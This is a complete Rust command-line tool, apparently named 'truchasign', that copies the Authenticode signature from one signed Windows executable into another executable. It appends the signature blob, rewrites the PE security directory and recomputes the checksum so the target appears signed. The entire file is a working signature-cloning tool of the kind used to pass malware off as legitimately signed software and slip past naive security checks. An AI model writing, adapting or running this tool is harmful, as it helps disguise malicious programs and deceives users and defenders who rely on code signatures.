use std::{env, fs, path::Path, process};

const DOS_LFANEW: usize = 0x3C;
const PE_SIG_LEN: usize = 4;
const COFF_HEADER_LEN: usize = 20;
const MAGIC_PE32: u16 = 0x10B;
const MAGIC_PE32_PLUS: u16 = 0x20B;
const SECURITY_DIR_INDEX: usize = 4;

struct PeOffsets {
    checksum: usize,
    sec_dir: usize,
}

fn pe_offsets(buf: &[u8]) -> anyhow::Result<PeOffsets> {
    if buf.len() < DOS_LFANEW + 4 {
        anyhow::bail!("file too small for DOS header");
    }
    if &buf[..2] != b"MZ" {
        anyhow::bail!("missing magic MZ");
    }
    let e_lfanew = u32::from_le_bytes(buf[DOS_LFANEW..DOS_LFANEW + 4].try_into()?) as usize;
    let opt_base = e_lfanew + PE_SIG_LEN + COFF_HEADER_LEN;
    if buf.len() < opt_base + 2 || &buf[e_lfanew..e_lfanew + 4] != b"PE\0\0" {
        anyhow::bail!("Invalid PE signature");
    }
    let magic = u16::from_le_bytes(buf[opt_base..opt_base + 2].try_into()?);
    let (checksum_rel, dir_base) = match magic {
        MAGIC_PE32 => (0x40, 0x60),
        MAGIC_PE32_PLUS => (0x40, 0x70),
        m => anyhow::bail!("Unknown Magic PE: 0x{:X}", m),
    };
    Ok(PeOffsets {
        checksum: opt_base + checksum_rel,
        sec_dir: opt_base + dir_base + SECURITY_DIR_INDEX * 8,
    })
}

fn read_u32(buf: &[u8], off: usize) -> anyhow::Result<u32> {
    Ok(u32::from_le_bytes(buf[off..off + 4].try_into()?))
}

fn extract_signature(buf: &[u8]) -> anyhow::Result<Vec<u8>> {
    let off = pe_offsets(buf)?;
    let va = read_u32(buf, off.sec_dir)? as usize;
    let sz = read_u32(buf, off.sec_dir + 4)? as usize;
    if va == 0 || sz == 0 {
        anyhow::bail!("The origin does not have a digital signature.");
    }
    if va.checked_add(sz).map_or(true, |end| end > buf.len()) {
        anyhow::bail!("security directory out of range");
    }
    println!("[+] origin signature: offset=0x{:X} size={} bytes", va, sz);
    Ok(buf[va..va + sz].to_vec())
}

fn calculate_checksum(buf: &[u8], checksum_offset: usize) -> u32 {
    let mut sum: u32 = 0;
    let mut i = 0;
    while i + 1 < buf.len() {
        if i == checksum_offset {
            i += 4;
            continue;
        }
        let word = u16::from_le_bytes([buf[i], buf[i + 1]]) as u32;
        sum += word;
        sum = (sum & 0xFFFF) + (sum >> 16);
        i += 2;
    }
    if i < buf.len() {
        sum += buf[i] as u32;
        sum = (sum & 0xFFFF) + (sum >> 16);
    }
    sum = (sum & 0xFFFF) + (sum >> 16);
    sum.wrapping_add(buf.len() as u32)
}

fn inject_signature(mut buf: Vec<u8>, sig: &[u8]) -> anyhow::Result<Vec<u8>> {
    let off = pe_offsets(&buf)?;

    let pad = (8 - buf.len() % 8) % 8;
    buf.resize(buf.len() + pad, 0);

    let new_va = u32::try_from(buf.len())?;
    let new_sz = u32::try_from(sig.len())?;
    buf.extend_from_slice(sig);

    buf[off.sec_dir..off.sec_dir + 4].copy_from_slice(&new_va.to_le_bytes());
    buf[off.sec_dir + 4..off.sec_dir + 8].copy_from_slice(&new_sz.to_le_bytes());

    buf[off.checksum..off.checksum + 4].copy_from_slice(&[0u8; 4]);
    let checksum = calculate_checksum(&buf, off.checksum);
    buf[off.checksum..off.checksum + 4].copy_from_slice(&checksum.to_le_bytes());

    println!("[+] injected va=0x{:X} size={} checksum=0x{:08X}", new_va, new_sz, checksum);
    Ok(buf)
}

fn run() -> anyhow::Result<()> {
    let args: Vec<String> = env::args().collect();
    if args.len() < 4 {
        eprintln!("usage: {} <signed.exe> <objective.exe> <output.exe>",
            Path::new(&args[0]).file_name().and_then(|s| s.to_str()).unwrap_or("truchasign"));
        process::exit(2);
    }

    let src = fs::read(&args[1])?;
    let dst = fs::read(&args[2])?;

    let sig = extract_signature(&src)?;
    let result = inject_signature(dst, &sig)?;
    fs::write(&args[3], &result)?;

    println!("[!] done -> {}", args[3]);
    Ok(())
}

fn main() {
    if let Err(e) = run() {
        eprintln!("[x] {:#}", e);
        process::exit(1);
    }
}
